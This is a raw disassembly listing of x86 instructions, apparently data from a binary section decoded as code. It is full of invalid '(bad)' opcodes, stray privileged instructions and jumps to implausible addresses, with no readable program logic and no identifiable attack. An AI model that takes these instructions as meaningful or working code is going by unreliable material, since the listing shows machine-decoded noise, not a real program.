  417a56:	push   0x77eac738
  417a5b:	mov    al,ds:0x46bf41e1
  417a60:	les    eax,FWORD PTR [ecx+0x16cff23d]
  417a66:	jns    0x417ad0
  417a68:	mov    ecx,DWORD PTR [ebx]
  417a6a:	adc    ah,BYTE PTR [edi]
  417a6c:	jne    0x417a66
  417a6e:	call   0xad515a5b
  417a73:	ins    BYTE PTR es:[edi],dx
  417a74:	es sahf 
  417a76:	stc    
  417a77:	jne    0x417aca
  417a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a7a:	(bad)  
  417a7c:	dec    ebp
  417a7d:	or     BYTE PTR [edi+eiz*4+0x43],dh
  417a81:	jmp    0x417a44
  417a83:	xor    BYTE PTR [ebp-0x12],bh
  417a86:	cmp    eax,0x7dedba80
  417a8b:	loop   0x417af5
  417a8d:	rcr    DWORD PTR [edi+0x76],cl
  417a90:	daa    
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x50365515]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0x55000001
  417b0d:	add    ebx,DWORD PTR [ebp-0x69]
  417b10:	loope  0x417b5c
  417b12:	mov    bh,0x56
  417b14:	cmp    ah,BYTE PTR [edx+0x1]
  417b17:	pop    ecx
  417b18:	adc    eax,DWORD PTR [ecx+0x658994bc]
  417b1e:	retf   0x93b8
  417b21:	call   DWORD PTR [esi+0x4d]
  417b24:	(bad)  
  417b25:	adc    esi,DWORD PTR [ecx+0xc2ec636]
  417b2b:	enter  0xbc3a,0x2
  417b2f:	loop   0x417adf
  417b31:	dec    eax
  417b32:	dec    esi
  417b33:	sub    ah,al
  417b35:	or     eax,0xe867c35d
  417b3a:	push   ebp
  417b3b:	icebp  
  417b3c:	retf   0x2b87
  417b3f:	dec    esp
  417b40:	imul   ebx,edi,0xffffffca
  417b43:	ins    DWORD PTR es:[edi],dx
  417b44:	sbb    eax,0x30a81b00
  417b49:	cmp    al,0x61
  417b4b:	xor    DWORD PTR [eax],0x40
  417b4e:	lods   eax,DWORD PTR cs:[esi]
  417b50:	es loop 0x417b3c
  417b53:	pop    esi
  417b54:	mov    esi,0xd28620ce
  417b59:	lock test eax,0xd4720df2
  417b5f:	dec    edx
  417b60:	add    BYTE PTR [ebp+0x35],al
  417b63:	out    dx,al
  417b64:	shr    DWORD PTR [ebp+0x6d],0x7e
  417b68:	int3   
  417b69:	and    eax,0xc2daa74d
  417b6e:	cmp    DWORD PTR [eax+0x338b8025],ecx
  417b74:	sbb    dl,BYTE PTR [ebx-0x6d45cbb3]
  417b7a:	daa    
  417b7b:	push   0xaf57576f
  417b80:	jg     0x417ba0
  417b82:	jle    0x417be3
  417b84:	enter  0x6a10,0xd6
  417b88:	pop    eax
  417b89:	pushf  
  417b8a:	xchg   edi,eax
  417b8b:	fistp  DWORD PTR [edx]
  417b8d:	mov    esp,0x1a4131e7
  417b92:	push   0x49
  417b94:	sbb    dh,BYTE PTR [ebp+0x51]
  417b97:	pop    es
  417b98:	push   ebx
  417b99:	pop    ss
  417b9a:	push   edx
  417b9b:	das    
  417b9c:	pop    ecx
  417b9d:	pop    ecx
  417b9e:	cli    
  417b9f:	mov    ch,0xca
  417ba2:	into   
  417ba3:	mov    cl,0xab
  417ba6:	scas   eax,DWORD PTR es:[edi]
  417ba7:	mov    ebp,0xd96897bd
  417bac:	jl     0x417b71
  417bae:	jno    0x417b80
  417bb0:	ja     0x417bf0
  417bb2:	pop    eax
  417bb3:	jns    0x417b45
  417bb5:	cmp    cl,BYTE PTR [eax+0x3cbf0064]
  417bbb:	or     esi,DWORD PTR [edx]
  417bbd:	sub    eax,DWORD PTR [eax]
  417bbf:	sub    al,BYTE PTR [eax-0x50afa433]
  417bc5:	ret    0xf930
  417bc8:	loope  0x417c41
  417bca:	loope  0x417b80
  417bcc:	(bad)  
  417bcd:	repz rcl edx,0x23
  417bd1:	push   edi
  417bd2:	jbe    0x417be5
  417bd4:	jo     0x417b8c
  417bd6:	or     al,0xf7
  417bd8:	xchg   ebx,eax
  417bd9:	ja     0x417c34
  417bdb:	jae    0x417c50
  417bdd:	pop    ebx
  417bde:	(bad)  
  417bdf:	les    edi,FWORD PTR [ebp-0xae77fc8]
  417be5:	fxch   st(4)
  417be7:	sahf   
  417be8:	mov    dl,0x14
  417bea:	popf   
  417beb:	add    al,0x9e
  417bee:	ret    0x3ac5
  417bf1:	pop    edi
  417bf2:	stos   DWORD PTR es:[edi],eax
  417bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bf4:	ret    
  417bf5:	bound  ebp,QWORD PTR [eax+0x7d]
  417bf8:	add    ebp,DWORD PTR [esi-0x375b146a]
  417bfe:	(bad)  
  417bff:	mov    ecx,0x99a03151
  417c04:	add    al,0x7b
  417c06:	mov    bl,0x7b
  417c08:	pop    edi
  417c09:	(bad)  
  417c0a:	ss xor al,0x2a
  417c0d:	mov    al,0x82
  417c0f:	fcompp 
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xf4
  417c81:	ret    0xcedc
  417c84:	test   eax,0x50000fb
  417c89:	add    DWORD PTR [eax],eax
  417c8b:	add    BYTE PTR [edx-0x2c],al
  417c8e:	adc    dl,ah
  417c90:	sbb    BYTE PTR [ebp-0x43],al
  417c93:	jmp    0x1ecdfa8c
  417c98:	add    ecx,esp
  417c9a:	(bad)  
  417c9b:	shl    BYTE PTR [ecx],1
  417c9d:	inc    edi
  417c9e:	pop    ebp
  417c9f:	or     eax,DWORD PTR [edx]
  417ca1:	inc    esi
  417ca2:	inc    esi
  417ca3:	sbb    eax,0x992fe91b
  417ca8:	sub    edx,esp
  417caa:	std    
  417cab:	mov    ebp,0x817c4e34
  417cb0:	inc    ebp
  417cb1:	push   edi
  417cb2:	sbb    dl,BYTE PTR [edi]
  417cb4:	test   al,0x4
  417cb6:	fidiv  DWORD PTR [esi]
  417cb8:	sub    eax,0xbaf62c6a
  417cbd:	dec    edx
  417cbe:	(bad)  
  417cbf:	xlat   BYTE PTR ds:[ebx]
  417cc0:	daa    
  417cc1:	inc    ebp
  417cc2:	(bad)  
  417cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cc5:	in     al,0x21
  417cc7:	test   eax,0x8d7cde2
  417ccc:	dec    esi
  417ccd:	out    0xcc,al
  417ccf:	in     eax,dx
  417cd0:	mov    esi,0xd7c0f6bc
  417cd5:	fwait
  417cd6:	addr16 pop edx
  417cd8:	dec    ecx
  417cd9:	outs   dx,BYTE PTR ds:[esi]
  417cda:	loope  0x417ceb
  417cdc:	mov    esp,0x625138f8
  417ce1:	fwait
  417ce2:	jle    0x417c6b
  417ce4:	in     eax,dx
  417ce5:	pop    ss
  417ce6:	retf   
  417ce7:	fs and al,0x6d
  417cea:	lahf   
  417ceb:	mov    ebp,0xe123fa0c
  417cf0:	adc    eax,0xb12edc7e
  417cf5:	(bad)  
  417cf6:	addr16 aad 0x30
  417cf9:	sbb    cl,BYTE PTR [edi+0x22]
  417cfc:	mov    ah,BYTE PTR [ebx-0x37020ca7]
  417d02:	mov    edx,ecx
  417d04:	jmp    0x3d27:0x4b27f0c2
  417d0b:	mov    ecx,es
  417d0d:	add    eax,DWORD PTR [edx]
  417d0f:	sub    ebx,DWORD PTR [ebx+0x45833675]
  417d15:	jae    0x417cf7
  417d17:	(bad)  
  417d18:	and    eax,DWORD PTR [ecx+eax*8-0x3c225e85]
  417d1f:	test   DWORD PTR ds:0xfb61853b,esi
  417d25:	cmp    al,0xfa
  417d27:	out    dx,eax
  417d28:	js     0x417cec
  417d2a:	in     al,dx
  417d2b:	jo     0x417cd0
  417d2d:	test   eax,0x273f65e6
  417d32:	add    esp,DWORD PTR [eax-0x1c]
  417d35:	(bad)  
  417d36:	jnp    0x417db5
  417d38:	daa    
  417d39:	pushf  
  417d3a:	es jge 0x417cda
  417d3d:	fld    TBYTE PTR [esp+ebx*8]
  417d40:	inc    ebp
  417d41:	fstp   QWORD PTR [ebx+0x563b8007]
  417d47:	fisttp WORD PTR [esi-0x62]
  417d4a:	repnz mov bh,0x3c
  417d4d:	cmc    
  417d4e:	jmp    0xbb21c16
  417d53:	(bad)  
  417d54:	in     eax,0x44
  417d56:	les    edi,FWORD PTR [ebx]
  417d58:	or     eax,0xcea4bd57
  417d5d:	daa    
  417d5e:	loop   0x417dcf
  417d60:	lds    edx,FWORD PTR [edi-0x4f]
  417d63:	mov    ah,0x5c
  417d65:	sub    ecx,eax
  417d67:	mov    al,0x20
  417d69:	int3   
  417d6a:	fidiv  WORD PTR [ebx-0x4d]
  417d6d:	inc    ecx
  417d6e:	cli    
  417d6f:	jle    0x417d37
  417d71:	sbb    eax,0x31b5d4d3
  417d76:	jecxz  0x417d2e
  417d78:	iret   
  417d79:	push   ebp
  417d7a:	pusha  
  417d7b:	es mov dl,0xf4
  417d7e:	mov    ah,0x2b
  417d80:	sub    eax,0x4349bc7b
  417d85:	fld    DWORD PTR [esi+0x3de6c269]
  417d8b:	into   
  417d8c:	ins    BYTE PTR es:[edi],dx
  417d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d8e:	leave  
  417d8f:	pop    ebx
  417d90:	daa    
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	call   eax
  417e02:	mov    BYTE PTR [esi+0xfcae],cl
  417e08:	add    eax,0x6f000001
  417e0d:	retf   0x6c8d
  417e10:	out    0xd7,eax
  417e12:	or     ch,BYTE PTR [ecx-0x5a6e3d74]
  417e18:	push   eax
  417e19:	out    0xdf,eax
  417e1b:	push   ds
  417e1c:	mov    al,ds:0x6881674f
  417e21:	test   BYTE PTR [ebx-0x56de33c7],ch
  417e27:	ja     0x417ea1
  417e29:	aas    
  417e2a:	nop
  417e2b:	or     BYTE PTR [edi],cl
  417e2d:	icebp  
  417e2e:	xchg   ebx,eax
  417e2f:	xchg   esi,eax
  417e30:	push   ss
  417e31:	jmp    0x417dbd
  417e33:	pop    edi
  417e34:	cmp    al,0x1f
  417e36:	mov    ch,BYTE PTR [esi+0x704b45b9]
  417e3c:	mov    ebx,0xa0bb9a1
  417e41:	sbb    dh,ch
  417e43:	dec    edi
  417e44:	cmp    BYTE PTR [ebx-0x2c62c6be],dl
  417e4a:	adc    cl,0x4b
  417e4d:	cmp    eax,0xc17f1b55
  417e52:	inc    edx
  417e53:	sqrtps xmm2,XMMWORD PTR [ebx]
  417e56:	jnp    0x417ec1
  417e58:	mov    dl,0x31
  417e5a:	pop    esp
  417e5b:	jmp    0x8d7e:0x346556f7
  417e62:	jbe    0x417df3
  417e64:	jmp    0x417e0a
  417e66:	and    al,0xaa
  417e68:	lods   al,BYTE PTR ds:[esi]
  417e69:	pop    edx
  417e6a:	dec    BYTE PTR [edx+0x62c0115a]
  417e70:	outs   dx,DWORD PTR ds:[esi]
  417e71:	rcr    ebp,1
  417e73:	adc    eax,0xf52acb47
  417e78:	js     0x417e28
  417e7a:	jns    0x417e9c
  417e7c:	fwait
  417e7d:	(bad)
  417e81:	mov    ah,dh
  417e83:	xchg   ebp,eax
  417e84:	das    
  417e85:	mov    esi,0x132914e4
  417e8a:	es cmp al,0xa5
  417e8d:	mov    edx,0xd21c834b
  417e92:	nop
  417e93:	scas   al,BYTE PTR es:[edi]
  417e94:	add    bh,ch
  417e96:	fs scas al,BYTE PTR es:[edi]
  417e98:	cmp    al,0xf6
  417e9a:	push   ds
  417e9b:	sbb    BYTE PTR [eax],cl
  417e9d:	cmc    
  417e9e:	mov    edx,esp
  417ea0:	retf   0xe1e4
  417ea3:	xchg   BYTE PTR [ecx+0x1c88eb54],cl
  417ea9:	or     eax,0x7786ee0
  417eae:	lods   eax,DWORD PTR ds:[esi]
  417eaf:	or     BYTE PTR [esi-0x13],0x3c
  417eb3:	push   ebp
  417eb4:	fisub  WORD PTR [ebp-0x1e8de155]
  417eba:	ret    
  417ebb:	push   esi
  417ebc:	ror    DWORD PTR [edx+0x60e0359c],1
  417ec2:	in     al,dx
  417ec3:	neg    DWORD PTR [edi*2-0x16858a73]
  417eca:	(bad)  
  417ecb:	mov    ds:0x8582f352,eax
  417ed0:	adc    ebx,edx
  417ed2:	add    edi,DWORD PTR [esi]
  417ed4:	adc    BYTE PTR [edi-0x2d29128e],0xf9
  417edb:	cmp    ecx,0xf2f54180
  417ee1:	and    eax,0x63d4a83b
  417ee6:	icebp  
  417ee7:	and    al,0x25
  417ee9:	cwde   
  417eea:	inc    DWORD PTR [edx-0x4a604084]
  417ef0:	mov    BYTE PTR cs:[ebx+edx*8-0x2708d9b1],cl
  417ef8:	leave  
  417ef9:	cs xchg ecx,eax
  417efb:	push   cs
  417efc:	push   0xffffffb8
  417efe:	sub    eax,0xe0a5e495
  417f03:	mov    esi,0x32aa50bf
  417f08:	mov    ah,0xca
  417f0a:	sbb    eax,0x9ae10b3d
  417f0f:	adc    al,0xf
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	cmp    al,0x21
  417f82:	mov    ?,esp
  417f84:	mov    bl,0xfd
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x5f000001
  417f8d:	xor    BYTE PTR ds:0x55e69095,dl
  417f93:	stc    
  417f94:	or     esp,esp
  417f96:	dec    ecx
  417f97:	pushf  
  417f98:	bound  esp,QWORD PTR [ecx-0x7a]
  417f9b:	inc    ecx
  417f9c:	xchg   ecx,eax
  417f9d:	sbb    eax,0xfe7472a3
  417fa2:	cwde   
  417fa3:	add    DWORD PTR ds:0x81de39b5,esp
  417fa9:	or     al,0x89
  417fab:	adc    dl,BYTE PTR [esi]
  417fad:	fst    st(0)
  417faf:	xor    al,0x84
  417fb1:	sub    bl,dl
  417fb3:	pusha  
  417fb4:	addr16 out dx,eax
  417fb6:	test   eax,0x57804e47
  417fbb:	sub    esp,edi
  417fbd:	test   al,0x68
  417fbf:	outs   dx,DWORD PTR ds:[esi]
  417fc0:	inc    ebx
  417fc1:	xchg   BYTE PTR [esi],ch
  417fc3:	sbb    bh,BYTE PTR [ecx+eiz*4]
  417fc6:	(bad)  
  417fc7:	aad    0x64
  417fc9:	dec    ebp
  417fca:	mov    bh,0xd0
  417fcc:	jg     0x417fa6
  417fce:	stos   BYTE PTR es:[edi],al
  417fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fd0:	jle    0x417f7a
  417fd2:	mov    bl,0x14
  417fd4:	call   0x8396a29d
  417fd9:	lods   eax,DWORD PTR ds:[esi]
  417fda:	sbb    esp,0xffffffca
  417fdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fde:	jle    0x417f97
  417fe0:	div    bh
  417fe2:	lods   eax,DWORD PTR ds:[esi]
  417fe3:	into   
  417fe4:	mov    dh,0x5f
  417fe6:	sub    al,BYTE PTR [ecx-0x6f]
  417fe9:	lods   eax,DWORD PTR ds:[esi]
  417fea:	sbb    eax,ecx
  417fec:	adc    BYTE PTR [ebp+ebp*1-0x19],bh
  417ff0:	jbe    0x418063
  417ff2:	adc    ecx,eax
  417ff4:	pop    edi
  417ff5:	jne    0x417fe0
  417ff7:	das    
  417ff8:	imul   eax,ecx,0xffffffc8
  417ffb:	jb     0x41801a
  417ffd:	add    ebx,esi
  417fff:	cmp    BYTE PTR [esi+0x66],ah
  418002:	adc    DWORD PTR cs:[edx],ebp
  418005:	cmp    esp,esi
  418007:	popa   
  418008:	int3   
  418009:	test   DWORD PTR [ecx+ebx*4-0x27039e20],edx
  418010:	add    eax,0xc804f02f
  418015:	lods   eax,DWORD PTR ds:[esi]
  418016:	push   es
  418017:	pop    ss
  418018:	push   esp
  418019:	ror    BYTE PTR [edx],1
  41801b:	adc    bh,BYTE PTR ds:0xe6c1a9c5
  418021:	(bad)  
  418022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418023:	xor    eax,0x9814fb46
  418028:	repnz outs dx,DWORD PTR ds:[esi]
  41802a:	int    0x38
  41802c:	sbb    DWORD PTR [esi+0x15dcbc27],esi
  418032:	cwde   
  418033:	icebp  
  418034:	test   al,ch
  418036:	cmp    al,0x61
  418038:	ficom  DWORD PTR [ebx+ebx*1]
  41803b:	xchg   DWORD PTR [ecx-0x62],esi
  41803e:	push   esi
  41803f:	(bad)  
  418040:	enter  0x4879,0x80
  418044:	add    al,0xbf
  418046:	scas   al,BYTE PTR es:[edi]
  418047:	int    0x5c
  418049:	test   DWORD PTR [ebp-0x40],ecx
  41804c:	out    dx,al
  41804d:	mov    bh,BYTE PTR [ebx]
  41804f:	or     al,0x8c
  418051:	rcr    BYTE PTR [eax+0x27],cl
  418054:	lods   al,BYTE PTR ds:[esi]
  418055:	inc    eax
  418056:	ret    0x930f
  418059:	dec    edi
  41805a:	mov    dl,0x4d
  41805c:	stos   DWORD PTR es:[edi],eax
  41805d:	aam    0xb3
  41805f:	and    bl,BYTE PTR [eax]
  418061:	pop    ebx
  418062:	dec    eax
  418063:	push   esi
  418064:	or     esi,edx
  418066:	push   esp
  418067:	xchg   esi,eax
  418068:	jmp    0xe42e180a
  41806d:	test   BYTE PTR ds:0x76994dac,dh
  418073:	ret    0x4b5d
  418076:	iret   
  418077:	dec    edx
  418078:	test   eax,0x12f7a1e7
  41807d:	adc    DWORD PTR [ebx+0x1f],edi
  418080:	dec    ecx
  418081:	pushf  
  418082:	jl     0x418099
  418084:	mov    es,WORD PTR [edx+0x23027696]
  41808a:	mov    WORD PTR [ebp-0x21caf5e],?
  418090:	out    dx,al
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x582fdebc,eax
  418101:	cmp    DWORD PTR [ebx+0x5d],0xffffffb8
  418105:	inc    BYTE PTR [eax]
  418107:	add    BYTE PTR ds:0xb2000001,al
  41810d:	iret   
  41810e:	add    al,0x30
  418110:	add    BYTE PTR [di+0x722a],dl
  418115:	into   
  418116:	repz mov ds:0x322355d6,al
  41811c:	into   
  41811d:	xchg   edx,eax
  41811e:	add    esi,DWORD PTR [ecx+ebx*8-0x39427588]
  418125:	push   eax
  418126:	inc    ebx
  418127:	ret    0x6b41
  41812a:	jp     0x418105
  41812c:	push   ecx
  41812d:	out    0x68,eax
  41812f:	sti    
  418130:	cld    
  418131:	loop   0x418135
  418133:	jns    0x4181ad
  418135:	sub    bh,BYTE PTR [edx+ecx*1-0x3d]
  418139:	mov    WORD PTR [edi-0x1d],?
  41813c:	inc    edx
  41813d:	push   cs
  41813e:	int    0xf5
  418140:	push   esp
  418141:	jge    0x4180f8
  418143:	retf   0x34fe
  418146:	sub    eax,DWORD PTR [ebx+0x43]
  418149:	cmp    dh,BYTE PTR [ebp+ebx*2-0x34ece496]
  418150:	test   BYTE PTR [eax-0x49c46a5d],0x3b
  418157:	jae    0x418128
  418159:	pushf  
  41815a:	outs   dx,BYTE PTR ds:[esi]
  41815b:	out    dx,eax
  41815c:	mov    ds:0x4bee2bf,eax
  418161:	pop    esi
  418162:	sub    eax,0xf8ff15f
  418167:	or     al,0xa7
  418169:	pcmpgtw mm6,QWORD PTR [edx]
  41816c:	sub    DWORD PTR [eax+edx*4-0x4a9c8a26],0x34
  418174:	shr    BYTE PTR [ebp-0x465e9e35],1
  41817a:	mov    eax,ds:0xe97b9782
  41817f:	js     0x4181ed
  418181:	mov    esi,DWORD PTR [edi]
  418183:	xor    dh,BYTE PTR [eax-0x65]
  418186:	jno    0x4181cd
  418188:	cmp    eax,0xf2194ad8
  41818d:	add    BYTE PTR [edx],al
  41818f:	imul   DWORD PTR [edx+ebx*4+0x424e8e50]
  418196:	frstor [ebp-0x4615e915]
  41819c:	pop    esp
  41819d:	mov    edx,0x3279752
  4181a2:	fisttp QWORD PTR [ecx]
  4181a4:	mov    esi,0x651a1558
  4181a9:	sub    ebp,DWORD PTR [ecx+0x2d]
  4181ac:	push   esi
  4181ad:	add    BYTE PTR [ecx-0x79481157],al
  4181b3:	bound  edx,QWORD PTR [edi-0x3d]
  4181b6:	iret   
  4181b7:	dec    edx
  4181b8:	dec    esi
  4181b9:	jmp    0x6c4023b
  4181be:	push   esi
  4181bf:	rol    BYTE PTR [ebp+0x466fe071],1
  4181c5:	bound  edi,QWORD PTR [eax-0x64de1222]
  4181cb:	int    0x43
  4181cd:	push   edx
  4181ce:	fwait
  4181cf:	loop   0x418196
  4181d1:	push   esp
  4181d2:	cdq    
  4181d3:	sahf   
  4181d4:	rcl    DWORD PTR [edx-0x6ceb1f79],cl
  4181da:	in     eax,0x61
  4181dc:	mov    bl,0x9c
  4181de:	inc    ecx
  4181df:	xchg   ecx,eax
  4181e0:	aaa    
  4181e1:	(bad)  [edx]
  4181e3:	lods   eax,DWORD PTR ds:[esi]
  4181e4:	data16 jge 0x4181ea
  4181e7:	cmp    al,0x3
  4181e9:	xchg   esp,eax
  4181ea:	dec    edi
  4181eb:	mov    dl,0x87
  4181ed:	inc    edx
  4181ee:	gs out dx,eax
  4181f0:	xor    al,0x98
  4181f2:	rcr    BYTE PTR [esi],0x25
  4181f5:	pop    ebp
  4181f6:	shr    ch,cl
  4181f8:	push   eax
  4181f9:	std    
  4181fa:	dec    ecx
  4181fb:	retf   0x5e36
  4181fe:	icebp  
  4181ff:	lods   al,BYTE PTR ds:[esi]
  418200:	and    DWORD PTR [esi-0x43],ebp
  418203:	cmp    ebx,DWORD PTR [ecx+eax*4+0x5456a06b]
  41820a:	inc    eax
  41820b:	aaa    
  41820c:	push   ds
  41820d:	xor    BYTE PTR [esi+0x7be1],dl
	...
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x17e1b8d6
  418282:	into   
  418283:	sar    BYTE PTR [ebp+0x50000ff],cl
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    BYTE PTR [ebp-0x41],dl
  41828e:	clc    
  41828f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418290:	adc    eax,0x9f57c01e
  418295:	mov    esi,0xa89ab3fe
  41829a:	jmp    0x4182ea
  41829c:	jmp    0x969a40b6
  4182a1:	and    BYTE PTR [eax-0x61defd55],ch
  4182a7:	shl    ecx,0x16
  4182aa:	dec    eax
  4182ab:	inc    ebp
  4182ac:	mov    dl,0x63
  4182ae:	int3   
  4182af:	mov    eax,0x202d194a
  4182b4:	mov    ch,0xee
  4182b6:	ds test al,0x97
  4182b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182ba:	mul    DWORD PTR [ecx+0x2f4a7131]
  4182c0:	lock iret 
  4182c2:	push   cs
  4182c3:	mov    cl,0x42
  4182c5:	sbb    eax,0x951fa41d
  4182ca:	fist   WORD PTR [edi+0x4b]
  4182cd:	call   0x8e21:0x109f74ef
  4182d4:	mov    al,ds:0x672a7ad0
  4182d9:	push   ss
  4182da:	mov    ah,0x6e
  4182dc:	mov    cl,0x5a
  4182de:	jle    0x41830a
  4182e0:	es mov bh,0xf5
  4182e4:	jno    0x418337
  4182e6:	mov    bl,0x80
  4182e8:	aas    
  4182e9:	jl     0x4182b2
  4182eb:	fstp   QWORD PTR [edi+0x15e79df3]
  4182f1:	dec    edx
  4182f2:	sub    al,0x68
  4182f4:	ins    BYTE PTR es:[edi],dx
  4182f5:	mov    cl,0x43
  4182f7:	popa   
  4182f8:	add    BYTE PTR [edx+edx*2],al
  4182fb:	stos   DWORD PTR es:[edi],eax
  4182fc:	mov    ecx,0x4ecdb476
  418301:	int3   
  418302:	xchg   edi,eax
  418303:	retf   
  418304:	mov    cl,0xa
  418306:	retf   
  418307:	sub    dh,0xb3
  41830a:	jmp    0x55cc9421
  41830f:	jbe    0x41834c
  418311:	mov    cl,0xa7
  418313:	dec    BYTE PTR [eax+0x520c4d6e]
  418319:	sub    dl,BYTE PTR [eax+0x5225b3b5]
  41831f:	(bad)  
  418320:	jno    0x4182ce
  418322:	mov    ds:0xddf9139c,al
  418327:	mov    edi,0xfa54f491
  41832c:	mov    eax,ds:0xc9c45c30
  418331:	jb     0x41837e
  418333:	xor    ebx,edx
  418335:	shl    DWORD PTR [edx-0x4d],1
  418338:	dec    ebp
  418339:	xor    cl,BYTE PTR [esi+0x4ab8dfee]
  41833f:	xchg   cl,cl
  418341:	xor    ah,0x75
  418344:	pop    ecx
  418345:	aam    0x2f
  418347:	dec    esp
  418348:	mov    ebp,0x32880429
  41834d:	out    0x66,eax
  41834f:	rcl    ch,cl
  418351:	test   BYTE PTR [edx+0x2d],dh
  418354:	pop    ds
  418355:	dec    ebp
  418356:	js     0x418389
  418358:	retf   0x172a
  41835b:	cmp    eax,DWORD PTR [edi]
  41835d:	dec    edx
  41835e:	into   
  41835f:	fwait
  418360:	in     al,dx
  418361:	fsub   st,st(2)
  418363:	out    0x80,eax
  418365:	fs retf 0x63d7
  418369:	adc    DWORD PTR [edi+0x70],edi
  41836c:	sbb    BYTE PTR [ecx-0x67],ch
  41836f:	std    
  418370:	dec    eax
  418371:	mov    ebp,0x97160cae
  418376:	push   0xffffffba
  418378:	xor    BYTE PTR [esi],cl
  41837a:	nop
  41837b:	push   edx
  41837c:	xor    ecx,DWORD PTR [eax+0x567a61e1]
  418382:	aas    
  418383:	fwait
  418384:	sti    
  418385:	adc    ebx,DWORD PTR [ebx]
  418387:	fdivr  DWORD PTR [edx-0x63]
  41838a:	clc    
  41838b:	jne    0x418387
  41838d:	enter  0xba0b,0x70
	...
  4183f1:	add    BYTE PTR [eax],al
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	or     DWORD PTR [edx],esi
  418402:	cmp    al,0xe0
  418404:	ret    0x100
  418407:	add    BYTE PTR ds:0xfc000001,al
  41840d:	mov    al,ds:0x57192a13
  418412:	jno    0x418449
  418414:	and    BYTE PTR [eax-0x5416c226],dl
  41841a:	inc    ebp
  41841b:	test   bh,dl
  41841d:	jecxz  0x418420
  41841f:	scas   al,BYTE PTR es:[edi]
  418420:	shl    BYTE PTR [esi],cl
  418422:	push   ebx
  418423:	inc    esi
  418424:	add    eax,0xe883b3ab
  418429:	jmp    0x4183b3
  41842b:	neg    DWORD PTR [esi]
  41842d:	jo     0x418490
  41842f:	jne    0x418448
  418431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418432:	push   ecx
  418433:	popa   
  418434:	push   es
  418435:	push   eax
  418436:	fnstsw WORD PTR gs:[ebx+0x60]
  41843a:	sub    DWORD PTR [ebx-0x15],ecx
  41843d:	stc    
  41843e:	fmul   DWORD PTR [esi]
  418440:	xchg   esi,eax
  418441:	cmp    BYTE PTR [eax+0x2a993e96],al
  418447:	xchg   ebx,eax
  418448:	shl    cl,cl
  41844a:	add    eax,0x7baf1401
  41844f:	dec    esi
  418450:	(bad)  
  418451:	in     eax,dx
  418452:	inc    esi
  418453:	(bad)  
  418454:	mov    edi,0x882da380
  418459:	outs   dx,DWORD PTR ds:[esi]
  41845a:	adc    dl,BYTE PTR [edx-0x5f]
  41845d:	in     al,dx
  41845e:	sub    bh,BYTE PTR [ebp-0x5ccd9d57]
  418464:	add    al,0xa8
  418466:	fnstcw WORD PTR [ebx-0x54]
  418469:	mov    ah,0xe4
  41846b:	fwait
  41846c:	stc    
  41846d:	inc    esp
  41846e:	aad    0xfd
  418470:	and    eax,0x659e45a3
  418475:	pop    es
  418476:	or     al,bl
  418478:	je     0x418490
  41847a:	pushf  
  41847b:	xor    DWORD PTR [edi+0x8],ebx
  41847e:	mov    ah,0xb4
  418480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418481:	jae    0x418481
  418483:	fwait
  418484:	add    cl,BYTE PTR [edx-0x57]
  418487:	add    ecx,DWORD PTR [edx]
  418489:	mov    DWORD PTR [ebx],eax
  41848b:	lahf   
  41848c:	push   cs
  41848d:	mov    cl,0x21
  41848f:	add    eax,0xcdb288a3
  418494:	popa   
  418495:	add    edx,DWORD PTR [ebx-0x3e]
  418498:	mov    eax,ds:0xd8a38d7b
  41849d:	cmp    ebp,DWORD PTR [ebx-0x3e24103f]
  4184a3:	ins    DWORD PTR es:[edi],dx
  4184a4:	sbb    cl,BYTE PTR [ebx-0x3b]
  4184a7:	clc    
  4184a8:	inc    edx
  4184a9:	lds    edx,FWORD PTR [edx-0x2fe441a8]
  4184af:	inc    ebx
  4184b0:	mov    ebx,edx
  4184b2:	mov    ah,0x9a
  4184b4:	jle    0x4184e8
